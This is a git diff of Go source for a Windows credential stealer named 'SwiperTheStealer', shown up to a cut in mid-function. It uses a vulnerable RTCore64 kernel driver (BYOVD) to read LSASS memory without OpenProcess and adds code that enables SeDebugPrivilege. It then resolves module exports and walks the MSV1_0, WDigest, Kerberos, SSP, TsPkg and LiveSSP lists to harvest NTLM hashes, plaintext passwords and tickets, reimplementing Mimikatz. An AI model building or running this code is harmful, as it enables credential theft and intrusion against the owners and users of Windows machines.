@@ -14,9 +14,9 @@ import (
 )
 
 // ========== COMPREHENSIVE LSASS EXTRACTION CHECKLIST FROM MIMIKATZ ANALYSIS ==========
-// ✓ POINT 1: Kernel Driver Loading (RTCore64.sys) - IMPLEMENTED 
+// ✓ POINT 1: Kernel Driver Loading (RTCore64.sys) - IMPLEMENTED
 // ✓ POINT 2: Physical Memory Access via RTCore - IMPLEMENTED
-// ✓ POINT 3: LSASS Process Discovery & PID Resolution - IMPLEMENTED 
+// ✓ POINT 3: LSASS Process Discovery & PID Resolution - IMPLEMENTED
 // ✓ POINT 4: Module Enumeration (lsasrv.dll, wdigest.dll, etc.) - IMPLEMENTED
 // ✓ POINT 5: Binary Pattern Scanning for Critical Offsets - IMPLEMENTED
 // ✓ POINT 6: LogonSessionList Discovery via Pattern Matching - IMPLEMENTED
@@ -111,11 +111,11 @@ type KIWI_MSV1_0_PRIMARY_CREDENTIALS struct {
 }
 
 type SwiperTheStealer struct {
-	rtcore        *byovd.RTCoreExploit
-	logger        *logger.Logger
-	lsassPID      uint32
-	lsasrvBase    uint64
-	lsasrvSize    uint32
+	rtcore         *byovd.RTCoreExploit
+	logger         *logger.Logger
+	lsassPID       uint32
+	lsasrvBase     uint64
+	lsasrvSize     uint32
 	decryptionKeys *byovd.DecryptionKeys
 }
 
@@ -196,9 +196,9 @@ func (sts *SwiperTheStealer) Execute() ([]Credential, error) {
 func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
 	sts.logger.Info("=== COMPREHENSIVE MIMIKATZ IMPLEMENTATION (18-POINT CHECKLIST) ===")
 
-	// POINTS 1-6: Initialize the proper offset extractor targeting lsasrv.dll  
+	// POINTS 1-6: Initialize the proper offset extractor targeting lsasrv.dll
 	offsetExtractor := byovd.NewLsassOffsetExtractor(sts.rtcore, sts.logger)
-	
+
 	// POINTS 7-11: Initialize LSA memory decryption (AES/3DES keys + LsaUnprotectMemory)
 	decryptor := NewLsaMemoryDecryptor(sts.rtcore, sts.logger)
 
@@ -208,7 +208,7 @@ func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
 	if err != nil {
 		return nil, fmt.Errorf("failed to get lsasrv.dll info: %v", err)
 	}
-	
+
 	// Initialize the decryption keys
 	err = decryptor.InitializeDecryptionKeys(lsasrvBase, lsasrvSize)
 	if err != nil {
@@ -217,29 +217,26 @@ func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
 	} else {
 		sts.logger.Info("LSA memory decryption keys initialized successfully!")
 	}
-	
-	// POINT 8: Open LSASS process handle for virtual memory access
-	lsassHandle, err := sts.openLSASSProcessHandle()
-	if err != nil {
-		return nil, fmt.Errorf("failed to open LSASS process handle: %v", err)
-	}
-	defer syscall.CloseHandle(lsassHandle)
-	
+
+	// POINT 8: NO PROCESS HANDLE NEEDED - WE USE RTCORE KERNEL DRIVER!
+	// This is the ENTIRE POINT of BYOVD - bypass OpenProcess restrictions!
+	sts.logger.Info("✓ Using RTCore64 kernel driver for direct memory access (NO OpenProcess needed!)")
+
 	// POINTS 12-18: Initialize comprehensive multi-package extractor (all auth packages)
 	comprehensiveExtractor := NewMultiPackageCredentialExtractor(
-		sts.rtcore, 
-		sts.logger, 
-		decryptor, 
-		sts.lsassPID, 
-		lsassHandle,
+		sts.rtcore,
+		sts.logger,
+		decryptor,
+		sts.lsassPID,
+		0, // NO HANDLE NEEDED - we use kernel driver!
 	)
-	
+
 	// Step 5: Initialize all authentication package globals
 	err = comprehensiveExtractor.InitializePackageGlobals()
 	if err != nil {
 		sts.logger.Warnf("Failed to initialize package globals: %v", err)
 	}
-	
+
 	// Extract from all authentication packages with comprehensive approach
 	allCredentials, err := comprehensiveExtractor.ExtractAllPackageCredentials()
 	if err != nil {
@@ -252,39 +249,131 @@ func (sts *SwiperTheStealer) ExtractCredentials() ([]Credential, error) {
 
 // openLSASSProcessHandle - POINT 8: Virtual memory access handle (ReadProcessMemory approach)
 func (sts *SwiperTheStealer) openLSASSProcessHandle() (syscall.Handle, error) {
+	// Enable SeDebugPrivilege first
+	if err := enableSeDebugPrivilege(); err != nil {
+		sts.logger.Warnf("Failed to enable SeDebugPrivilege: %v (continuing anyway)", err)
+	} else {
+		sts.logger.Info("SeDebugPrivilege enabled successfully")
+	}
+
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	openProcess := kernel32.MustFindProc("OpenProcess")
-	
+
 	// Open with necessary permissions for virtual memory reading
 	handle, _, err := openProcess.Call(
 		uintptr(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION),
 		0, // bInheritHandle = FALSE
 		uintptr(sts.lsassPID),
 	)
-	
+
 	if handle == 0 {
 		return 0, fmt.Errorf("failed to open LSASS process: %v", err)
 	}
-	
+
 	sts.logger.Infof("Opened LSASS process handle: 0x%X", handle)
 	return syscall.Handle(handle), nil
 }
 
+// enableSeDebugPrivilege enables SeDebugPrivilege for the current process
+func enableSeDebugPrivilege() error {
+	type LUID struct {
+		LowPart  uint32
+		HighPart int32
+	}
+
+	type LUID_AND_ATTRIBUTES struct {
+		Luid       LUID
+		Attributes uint32
+	}
+
+	type TOKEN_PRIVILEGES struct {
+		PrivilegeCount uint32
+		Privileges     [1]LUID_AND_ATTRIBUTES
+	}
+
+	const (
+		SE_PRIVILEGE_ENABLED    = 0x00000002
+		TOKEN_ADJUST_PRIVILEGES = 0x0020
+		TOKEN_QUERY             = 0x0008
+	)
+
+	advapi32 := syscall.MustLoadDLL("advapi32.dll")
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+
+	openProcessToken := advapi32.MustFindProc("OpenProcessToken")
+	lookupPrivilegeValue := advapi32.MustFindProc("LookupPrivilegeValueW")
+	adjustTokenPrivileges := advapi32.MustFindProc("AdjustTokenPrivileges")
+	getCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
+
+	// Get current process handle
+	currentProcess, _, _ := getCurrentProcess.Call()
+
+	// Open process token
+	var token syscall.Handle
+	ret, _, err := openProcessToken.Call(
+		currentProcess,
+		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
+		uintptr(unsafe.Pointer(&token)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("OpenProcessToken failed: %v", err)
+	}
+	defer syscall.CloseHandle(token)
+
+	// Lookup SeDebugPrivilege
+	var luid LUID
+	seDebugName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
+	ret, _, err = lookupPrivilegeValue.Call(
+		0,
+		uintptr(unsafe.Pointer(seDebugName)),
+		uintptr(unsafe.Pointer(&luid)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
+	}
+
+	// Prepare TOKEN_PRIVILEGES structure
+	tp := TOKEN_PRIVILEGES{
+		PrivilegeCount: 1,
+		Privileges: [1]LUID_AND_ATTRIBUTES{
+			{
+				Luid:       luid,
+				Attributes: SE_PRIVILEGE_ENABLED,
+			},
+		},
+	}
+
+	// Enable the privilege
+	ret, _, err = adjustTokenPrivileges.Call(
+		uintptr(token),
+		0,
+		uintptr(unsafe.Pointer(&tp)),
+		0,
+		0,
+		0,
+	)
+	if ret == 0 {
+		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
+	}
+
+	return nil
+}
+
 // MultiPackageCredentialExtractor - POINTS 12-18: Support all authentication packages
 type MultiPackageCredentialExtractor struct {
-	rtcore          *byovd.RTCoreExploit
-	logger          *logger.Logger
-	decryptor       *LsaMemoryDecryptor
-	lsassHandle     syscall.Handle
-	lsassPID        uint32
-	
+	rtcore      *byovd.RTCoreExploit
+	logger      *logger.Logger
+	decryptor   *LsaMemoryDecryptor
+	lsassHandle syscall.Handle
+	lsassPID    uint32
+
 	// Package-specific globals found in LSASS
-	logonSessionList    uint64 // lsasrv!LogonSessionList
-	wDigestLogSessList  uint64 // wdigest!l_LogSessList  
-	kerbGlobalTable     uint64 // kerberos!KerbGlobalLogonSessionTable
-	sspCredentialList   uint64 // msv1_0!SspCredentialList
-	tspGlobalCredTable  uint64 // tspkg!TSGlobalCredTable
-	livesspGlobalList   uint64 // livessp!LiveGlobalLogonSessionList
+	logonSessionList   uint64 // lsasrv!LogonSessionList
+	wDigestLogSessList uint64 // wdigest!l_LogSessList
+	kerbGlobalTable    uint64 // kerberos!KerbGlobalLogonSessionTable
+	sspCredentialList  uint64 // msv1_0!SspCredentialList
+	tspGlobalCredTable uint64 // tspkg!TSGlobalCredTable
+	livesspGlobalList  uint64 // livessp!LiveGlobalLogonSessionList
 }
 
 func NewMultiPackageCredentialExtractor(rtcore *byovd.RTCoreExploit, logger *logger.Logger, decryptor *LsaMemoryDecryptor, lsassPID uint32, lsassHandle syscall.Handle) *MultiPackageCredentialExtractor {
@@ -300,102 +389,102 @@ func NewMultiPackageCredentialExtractor(rtcore *byovd.RTCoreExploit, logger *log
 // InitializePackageGlobals - Find global variables for all authentication packages
 func (mpce *MultiPackageCredentialExtractor) InitializePackageGlobals() error {
 	mpce.logger.Info("POINTS 12-18: Initializing all authentication package globals")
-	
+
 	// Find LogonSessionList in lsasrv.dll (main MSV1_0 credentials)
 	if addr, err := mpce.findSymbolInModule("lsasrv.dll", "LogonSessionList"); err == nil {
 		mpce.logonSessionList = addr
 		mpce.logger.Infof("Found lsasrv!LogonSessionList at 0x%X", addr)
 	}
-	
+
 	// Find WDigest global (plaintext passwords)
 	if addr, err := mpce.findSymbolInModule("wdigest.dll", "l_LogSessList"); err == nil {
 		mpce.wDigestLogSessList = addr
 		mpce.logger.Infof("Found wdigest!l_LogSessList at 0x%X", addr)
 	}
-	
+
 	// Find Kerberos global (tickets and keys)
 	if addr, err := mpce.findSymbolInModule("kerberos.dll", "KerbGlobalLogonSessionTable"); err == nil {
 		mpce.kerbGlobalTable = addr
 		mpce.logger.Infof("Found kerberos!KerbGlobalLogonSessionTable at 0x%X", addr)
 	}
-	
+
 	// Find SSP credentials
 	if addr, err := mpce.findSymbolInModule("msv1_0.dll", "SspCredentialList"); err == nil {
 		mpce.sspCredentialList = addr
 		mpce.logger.Infof("Found msv1_0!SspCredentialList at 0x%X", addr)
 	}
-	
+
 	// Find TsPkg credentials (Terminal Services)
 	if addr, err := mpce.findSymbolInModule("tspkg.dll", "TSGlobalCredTable"); err == nil {
 		mpce.tspGlobalCredTable = addr
 		mpce.logger.Infof("Found tspkg!TSGlobalCredTable at 0x%X", addr)
 	}
-	
+
 	// Find LiveSSP credentials
 	if addr, err := mpce.findSymbolInModule("livessp.dll", "LiveGlobalLogonSessionList"); err == nil {
 		mpce.livesspGlobalList = addr
 		mpce.logger.Infof("Found livessp!LiveGlobalLogonSessionList at 0x%X", addr)
 	}
-	
+
 	return nil
 }
 
 // findSymbolInModule - REAL SYMBOL RESOLUTION like mimikatz
 func (mpce *MultiPackageCredentialExtractor) findSymbolInModule(moduleName string, symbolName string) (uint64, error) {
 	mpce.logger.Debugf("Resolving symbol %s in module %s", symbolName, moduleName)
-	
+
 	// Step 1: Find the module in LSASS process
 	moduleBase, moduleSize, err := mpce.findModuleInProcess(moduleName)
 	if err != nil {
 		return 0, fmt.Errorf("module %s not found: %v", moduleName, err)
 	}
-	
+
 	mpce.logger.Debugf("Found %s at base 0x%X, size 0x%X", moduleName, moduleBase, moduleSize)
-	
+
 	// Step 2: Read PE headers to find export table
 	dosHeader, err := mpce.readVirtualMemory(moduleBase, 64) // IMAGE_DOS_HEADER
 	if err != nil {
 		return 0, fmt.Errorf("failed to read DOS header: %v", err)
 	}
-	
+
 	// Check DOS signature "MZ"
 	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
 		return 0, fmt.Errorf("invalid DOS signature")
 	}
-	
+
 	// Get PE offset
 	peOffset := binary.LittleEndian.Uint32(dosHeader[60:64])
-	
+
 	// Read NT headers
 	ntHeaders, err := mpce.readVirtualMemory(moduleBase+uint64(peOffset), 256)
 	if err != nil {
 		return 0, fmt.Errorf("failed to read NT headers: %v", err)
 	}
-	
+
 	// Check PE signature "PE\0\0"
 	if ntHeaders[0] != 'P' || ntHeaders[1] != 'E' || ntHeaders[2] != 0 || ntHeaders[3] != 0 {
 		return 0, fmt.Errorf("invalid PE signature")
 	}
-	
+
 	// Get export table RVA (offset 120 in optional header for x64)
 	exportTableRVA := binary.LittleEndian.Uint32(ntHeaders[136:140]) // Export table RVA
 	if exportTableRVA == 0 {
 		return 0, fmt.Errorf("no export table found")
 	}
-	
+
 	// Step 3: Parse export table
 	exportTable, err := mpce.readVirtualMemory(moduleBase+uint64(exportTableRVA), 40) // IMAGE_EXPORT_DIRECTORY
 	if err != nil {
 		return 0, fmt.Errorf("failed to read export table: %v", err)
 	}
-	
+
 	numberOfNames := binary.LittleEndian.Uint32(exportTable[24:28])
 	addressTableRVA := binary.LittleEndian.Uint32(exportTable[28:32])
 	nameTableRVA := binary.LittleEndian.Uint32(exportTable[32:36])
 	ordinalTableRVA := binary.LittleEndian.Uint32(exportTable[36:40])
-	
+
 	mpce.logger.Debugf("Export table: %d names, addresses at 0x%X", numberOfNames, addressTableRVA)
-	
+
 	// Step 4: Search through exported names
 	for i := uint32(0); i < numberOfNames; i++ {
 		// Read name RVA
@@ -404,13 +493,13 @@ func (mpce *MultiPackageCredentialExtractor) findSymbolInModule(moduleName strin
 			continue
 		}
 		nameRVA := binary.LittleEndian.Uint32(nameRVABytes)
-		
+
 		// Read the actual name (max 256 chars)
 		nameBytes, err := mpce.readVirtualMemory(moduleBase+uint64(nameRVA), 256)
 		if err != nil {
 			continue
 		}
-		
+
 		// Convert to string (null-terminated)
 		var name string
 		for j, b := range nameBytes {
@@ -419,7 +508,7 @@ func (mpce *MultiPackageCredentialExtractor) findSymbolInModule(moduleName strin
 				break
 			}
 		}
-		
+
 		if name == symbolName {
 			// Found it! Get the ordinal
 			ordinalBytes, err := mpce.readVirtualMemory(moduleBase+uint64(ordinalTableRVA)+uint64(i*2), 2)
@@ -427,32 +516,32 @@ func (mpce *MultiPackageCredentialExtractor) findSymbolInModule(moduleName strin
 				return 0, fmt.Errorf("failed to read ordinal: %v", err)
 			}
 			ordinal := binary.LittleEndian.Uint16(ordinalBytes)
-			
+
 			// Get function RVA from address table
 			funcRVABytes, err := mpce.readVirtualMemory(moduleBase+uint64(addressTableRVA)+uint64(ordinal*4), 4)
 			if err != nil {
 				return 0, fmt.Errorf("failed to read function RVA: %v", err)
 			}
 			funcRVA := binary.LittleEndian.Uint32(funcRVABytes)
-			
+
 			funcAddr := moduleBase + uint64(funcRVA)
 			mpce.logger.Infof("SYMBOL RESOLVED: %s!%s at 0x%X", moduleName, symbolName, funcAddr)
 			return funcAddr, nil
 		}
 	}
-	
+
 	return 0, fmt.Errorf("symbol %s not found in %s exports", symbolName, moduleName)
 }
 
 // findModuleInProcess - Find a loaded module in the LSASS process
 func (mpce *MultiPackageCredentialExtractor) findModuleInProcess(moduleName string) (uint64, uint32, error) {
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	
+
 	createToolhelp32Snapshot := kernel32.MustFindProc("CreateToolhelp32Snapshot")
 	module32FirstW := kernel32.MustFindProc("Module32FirstW")
 	module32NextW := kernel32.MustFindProc("Module32NextW")
 	closeHandle := kernel32.MustFindProc("CloseHandle")
-	
+
 	// Create module snapshot for LSASS process
 	snapshot, _, err := createToolhelp32Snapshot.Call(
 		0x8|0x10, // TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32
@@ -462,7 +551,7 @@ func (mpce *MultiPackageCredentialExtractor) findModuleInProcess(moduleName stri
 		return 0, 0, fmt.Errorf("failed to create module snapshot: %v", err)
 	}
 	defer closeHandle.Call(snapshot)
-	
+
 	// MODULEENTRY32W structure
 	type MODULEENTRY32W struct {
 		Size         uint32
@@ -476,39 +565,39 @@ func (mpce *MultiPackageCredentialExtractor) findModuleInProcess(moduleName stri
 		ModuleName   [256]uint16
 		ExePath      [260]uint16
 	}
-	
+
 	var me32 MODULEENTRY32W
 	me32.Size = uint32(unsafe.Sizeof(me32))
-	
+
 	// Get first module
 	ret, _, _ := module32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
 	if ret == 0 {
 		return 0, 0, fmt.Errorf("Module32FirstW failed")
 	}
-	
+
 	for {
 		currentModuleName := syscall.UTF16ToString(me32.ModuleName[:])
 		if currentModuleName == moduleName {
 			mpce.logger.Debugf("Found module %s at 0x%X, size 0x%X", moduleName, me32.ModBaseAddr, me32.ModBaseSize)
 			return uint64(me32.ModBaseAddr), me32.ModBaseSize, nil
 		}
-		
+
 		// Get next module
 		ret, _, _ = module32NextW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
 		if ret == 0 {
 			break
 		}
 	}
-	
+
 	return 0, 0, fmt.Errorf("module %s not found in process", moduleName)
 }
 
 // ExtractAllPackageCredentials - Extract from all authentication packages
 func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]Credential, error) {
 	var allCredentials []Credential
-	
+
 	mpce.logger.Info("COMPREHENSIVE EXTRACTION: Processing all authentication packages")
-	
+
 	// 1. MSV1_0 Package (NTLM/LM hashes)
 	if mpce.logonSessionList != 0 {
 		mpce.logger.Info("Extracting MSV1_0 credentials (NTLM/LM hashes)")
@@ -519,7 +608,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("MSV1_0 extraction failed: %v", err)
 		}
 	}
-	
+
 	// 2. WDigest Package (plaintext passwords)
 	if mpce.wDigestLogSessList != 0 {
 		mpce.logger.Info("Extracting WDigest credentials (plaintext passwords)")
@@ -530,7 +619,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("WDigest extraction failed: %v", err)
 		}
 	}
-	
+
 	// 3. Kerberos Package (tickets and keys)
 	if mpce.kerbGlobalTable != 0 {
 		mpce.logger.Info("Extracting Kerberos credentials (tickets/keys)")
@@ -541,7 +630,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("Kerberos extraction failed: %v", err)
 		}
 	}
-	
+
 	// 4. SSP Package (Security Support Provider)
 	if mpce.sspCredentialList != 0 {
 		mpce.logger.Info("Extracting SSP credentials")
@@ -552,7 +641,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("SSP extraction failed: %v", err)
 		}
 	}
-	
+
 	// 5. TsPkg Package (Terminal Services)
 	if mpce.tspGlobalCredTable != 0 {
 		mpce.logger.Info("Extracting TsPkg credentials")
@@ -563,7 +652,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("TsPkg extraction failed: %v", err)
 		}
 	}
-	
+
 	// 6. LiveSSP Package
 	if mpce.livesspGlobalList != 0 {
 		mpce.logger.Info("Extracting LiveSSP credentials")
@@ -574,7 +663,7 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 			mpce.logger.Warnf("LiveSSP extraction failed: %v", err)
 		}
 	}
-	
+
 	mpce.logger.Infof("COMPREHENSIVE EXTRACTION COMPLETE: Total %d credentials from all packages", len(allCredentials))
 	return allCredentials, nil
 }
@@ -582,79 +671,79 @@ func (mpce *MultiPackageCredentialExtractor) ExtractAllPackageCredentials() ([]C
 // Package-specific extraction methods
 func (mpce *MultiPackageCredentialExtractor) extractMSV1Credentials() ([]Credential, error) {
 	var credentials []Credential
-	
+
 	// Read LogonSessionList head using virtual memory
 	listHeadBytes, err := mpce.readVirtualMemory(mpce.logonSessionList, 8)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read LogonSessionList: %v", err)
 	}
-	
+
 	listHead := binary.LittleEndian.Uint64(listHeadBytes)
 	current := listHead
 	visited := make(map[uint64]bool)
-	
+
 	// Walk the linked list
 	for current != 0 && !visited[current] {
 		visited[current] = true
-		
+
 		// Read the logon session entry
 		sessionData, err := mpce.readVirtualMemory(current, 1024)
 		if err != nil {
 			break
 		}
-		
+
 		// Parse MSV1_0 logon session structure
 		if len(sessionData) >= int(unsafe.Sizeof(KIWI_MSV1_0_LIST_63{})) {
 			session := *(*KIWI_MSV1_0_LIST_63)(unsafe.Pointer(&sessionData[0]))
-			
+
 			// Extract credentials from this session
 			if sessionCreds, err := mpce.extractCredentialsFromMSV1Session(&session); err == nil {
 				credentials = append(credentials, sessionCreds...)
 			}
-			
+
 			current = session.Flink
 		} else {
 			break
 		}
 	}
-	
+
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractWDigestCredentials() ([]Credential, error) {
 	var credentials []Credential
 	mpce.logger.Info("WDigest extraction: Plaintext password extraction")
-	
+
 	if mpce.wDigestLogSessList == 0 {
 		mpce.logger.Warn("WDigest global list not found")
 		return credentials, nil
 	}
-	
+
 	// WDigest stores plaintext passwords in l_LogSessList doubly-linked list
 	current := mpce.wDigestLogSessList
 	visited := make(map[uint64]bool)
-	
+
 	for current != 0 && !visited[current] {
 		visited[current] = true
-		
+
 		// Read WDigest session entry (similar structure to MSV1_0)
 		sessionData, err := mpce.readVirtualMemory(current, 512)
 		if err != nil {
 			break
 		}
-		
+
 		// WDigest structure: Flink(8) + Blink(8) + UsageCount(4) + ... + Username + Domain + Password
 		if len(sessionData) >= 128 {
 			// Parse Flink for next entry
 			flink := binary.LittleEndian.Uint64(sessionData[0:8])
-			
+
 			// Try to extract plaintext password (stored as UNICODE_STRING at offset ~80)
 			// This is a simplified extraction - real implementation varies by Windows version
 			for offset := 40; offset < len(sessionData)-32; offset += 8 {
 				if offset+24 > len(sessionData) {
 					break
 				}
-				
+
 				// Look for UNICODE_STRING pattern (Length, MaxLength, Buffer pointer)
 				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
 				if length > 0 && length < 256 {
@@ -675,7 +764,7 @@ func (mpce *MultiPackageCredentialExtractor) extractWDigestCredentials() ([]Cred
 					}
 				}
 			}
-			
+
 			current = flink
 			if current == mpce.wDigestLogSessList {
 				break // Circular list - back to start
@@ -684,7 +773,7 @@ func (mpce *MultiPackageCredentialExtractor) extractWDigestCredentials() ([]Cred
 			break
 		}
 	}
-	
+
 	mpce.logger.Infof("WDigest: Found %d credentials", len(credentials))
 	return credentials, nil
 }
@@ -692,54 +781,54 @@ func (mpce *MultiPackageCredentialExtractor) extractWDigestCredentials() ([]Cred
 func (mpce *MultiPackageCredentialExtractor) extractKerberosCredentials() ([]Credential, error) {
 	var credentials []Credential
 	mpce.logger.Info("Kerberos extraction: Ticket and key extraction")
-	
+
 	if mpce.kerbGlobalTable == 0 {
 		mpce.logger.Warn("Kerberos global table not found")
 		return credentials, nil
 	}
-	
+
 	// Kerberos stores credentials in KerbGlobalLogonSessionTable hash table
 	// Read the hash table structure (array of pointers)
 	tableData, err := mpce.readVirtualMemory(mpce.kerbGlobalTable, 256)
 	if err != nil {
 		return credentials, nil
 	}
-	
+
 	// Iterate through hash table buckets (typically 32-64 buckets)
 	numBuckets := 32
 	for bucket := 0; bucket < numBuckets; bucket++ {
 		if bucket*8 >= len(tableData) {
 			break
 		}
-		
+
 		bucketPtr := binary.LittleEndian.Uint64(tableData[bucket*8 : bucket*8+8])
 		if bucketPtr == 0 {
 			continue
 		}
-		
+
 		// Walk the linked list for this bucket
 		current := bucketPtr
 		visited := make(map[uint64]bool)
-		
+
 		for current != 0 && !visited[current] {
 			visited[current] = true
-			
+
 			sessionData, err := mpce.readVirtualMemory(current, 512)
 			if err != nil {
 				break
 			}
-			
+
 			// Kerberos session structure: Flink + Credentials + LogonId + Username + Domain
 			if len(sessionData) >= 128 {
 				flink := binary.LittleEndian.Uint64(sessionData[0:8])
-				
+
 				// Extract username and domain from Kerberos session
 				// Kerberos uses similar UNICODE_STRING structures
 				for offset := 32; offset < len(sessionData)-24; offset += 8 {
 					if offset+24 > len(sessionData) {
 						break
 					}
-					
+
 					length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
 					if length > 0 && length < 200 {
 						bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
@@ -757,7 +846,7 @@ func (mpce *MultiPackageCredentialExtractor) extractKerberosCredentials() ([]Cre
 						}
 					}
 				}
-				
+
 				current = flink
 				if current == bucketPtr {
 					break
@@ -767,7 +856,7 @@ func (mpce *MultiPackageCredentialExtractor) extractKerberosCredentials() ([]Cre
 			}
 		}
 	}
-	
+
 	mpce.logger.Infof("Kerberos: Found %d credentials", len(credentials))
 	return credentials, nil
 }
@@ -775,34 +864,34 @@ func (mpce *MultiPackageCredentialExtractor) extractKerberosCredentials() ([]Cre
 func (mpce *MultiPackageCredentialExtractor) extractSSPCredentials() ([]Credential, error) {
 	var credentials []Credential
 	mpce.logger.Info("SSP extraction: Security Support Provider credentials")
-	
+
 	if mpce.sspCredentialList == 0 {
 		mpce.logger.Warn("SSP credential list not found")
 		return credentials, nil
 	}
-	
+
 	// SSP credentials are stored similar to MSV1_0
 	current := mpce.sspCredentialList
 	visited := make(map[uint64]bool)
 	maxIterations := 100
-	
+
 	for i := 0; i < maxIterations && current != 0 && !visited[current]; i++ {
 		visited[current] = true
-		
+
 		sessionData, err := mpce.readVirtualMemory(current, 256)
 		if err != nil {
 			break
 		}
-		
+
 		if len(sessionData) >= 64 {
 			flink := binary.LittleEndian.Uint64(sessionData[0:8])
-			
+
 			// Extract credentials from SSP structure
 			for offset := 16; offset < len(sessionData)-24; offset += 8 {
 				if offset+24 > len(sessionData) {
 					break
 				}
-				
+
 				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
 				if length > 0 && length < 128 {
 					bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
@@ -820,13 +909,13 @@ func (mpce *MultiPackageCredentialExtractor) extractSSPCredentials() ([]Credenti
 					}
 				}
 			}
-			
+
 			current = flink
 		} else {
 			break
 		}
 	}
-	
+
 	mpce.logger.Infof("SSP: Found %d credentials", len(credentials))
 	return credentials, nil
 }
@@ -834,24 +923,24 @@ func (mpce *MultiPackageCredentialExtractor) extractSSPCredentials() ([]Credenti
 func (mpce *MultiPackageCredentialExtractor) extractTsPkgCredentials() ([]Credential, error) {
 	var credentials []Credential
 	mpce.logger.Info("TsPkg extraction: Terminal Services credentials")
-	
+
 	if mpce.tspGlobalCredTable == 0 {
 		mpce.logger.Warn("TsPkg credential table not found")
 		return credentials, nil
 	}
-	
+
 	// TsPkg similar extraction pattern
 	tableData, err := mpce.readVirtualMemory(mpce.tspGlobalCredTable, 128)
 	if err != nil {
 		return credentials, nil
 	}
-	
+
 	// Simple extraction - TsPkg stores fewer credentials
 	for offset := 0; offset < len(tableData)-24; offset += 8 {
 		if offset+24 > len(tableData) {
 			break
 		}
-		
+
 		ptr := binary.LittleEndian.Uint64(tableData[offset : offset+8])
 		if ptr != 0 && (ptr&0xFFFF000000000000) != 0 {
 			if credData, err := mpce.readVirtualMemory(ptr, 128); err == nil {
@@ -859,7 +948,7 @@ func (mpce *MultiPackageCredentialExtractor) extractTsPkgCredentials() ([]Creden
 					if i+24 > len(credData) {
 						break
 					}
-					
+
 					length := binary.LittleEndian.Uint16(credData[i : i+2])
 					if length > 0 && length < 100 {
 						bufPtr := binary.LittleEndian.Uint64(credData[i+8 : i+16])
@@ -880,7 +969,7 @@ func (mpce *MultiPackageCredentialExtractor) extractTsPkgCredentials() ([]Creden
 			}
 		}
 	}
-	
+
 	mpce.logger.Infof("TsPkg: Found %d credentials", len(credentials))
 	return credentials, nil
 }
@@ -888,34 +977,34 @@ func (mpce *MultiPackageCredentialExtractor) extractTsPkgCredentials() ([]Creden
 func (mpce *MultiPackageCredentialExtractor) extractLiveSSPCredentials() ([]Credential, error) {
 	var credentials []Credential
 	mpce.logger.Info("LiveSSP extraction: Live SSP credentials")
-	
+
 	if mpce.livesspGlobalList == 0 {
 		mpce.logger.Warn("LiveSSP global list not found")
 		return credentials, nil
 	}
-	
+
 	// LiveSSP similar to MSV1_0 list walking
 	current := mpce.livesspGlobalList
 	visited := make(map[uint64]bool)
 	maxIterations := 50
-	
+
 	for i := 0; i < maxIterations && current != 0 && !visited[current]; i++ {
 		visited[current] = true
-		
+
 		sessionData, err := mpce.readVirtualMemory(current, 256)
 		if err != nil {
 			break
 		}
-		
+
 		if len(sessionData) >= 64 {
 			flink := binary.LittleEndian.Uint64(sessionData[0:8])
-			
+
 			// Extract LiveSSP credentials
 			for offset := 16; offset < len(sessionData)-24; offset += 8 {
 				if offset+24 > len(sessionData) {
 					break
 				}
-				
+
 				length := binary.LittleEndian.Uint16(sessionData[offset : offset+2])
 				if length > 0 && length < 128 {
 					bufferPtr := binary.LittleEndian.Uint64(sessionData[offset+8 : offset+16])
@@ -933,41 +1022,41 @@ func (mpce *MultiPackageCredentialExtractor) extractLiveSSPCredentials() ([]Cred
 					}
 				}
 			}
-			
+
 			current = flink
 		} else {
 			break
 		}
 	}
-	
+
 	mpce.logger.Infof("LiveSSP: Found %d credentials", len(credentials))
 	return credentials, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) extractCredentialsFromMSV1Session(session *KIWI_MSV1_0_LIST_63) ([]Credential, error) {
 	var credentials []Credential
-	
+
 	// Read username and domain using virtual memory (not physical)
 	username, err := mpce.readVirtualUnicodeString(&session.UserName)
 	if err != nil || username == "" || username == "$" {
 		return credentials, nil
 	}
-	
+
 	domain, _ := mpce.readVirtualUnicodeString(&session.Domain)
-	
+
 	// Walk credentials chain
 	if session.Credentials != 0 {
 		credPtr := session.Credentials
-		
+
 		for credPtr != 0 {
 			credData, err := mpce.readVirtualMemory(credPtr, uint32(unsafe.Sizeof(KIWI_MSV1_0_CREDENTIALS{})))
 			if err != nil {
 				break
 			}
-			
+
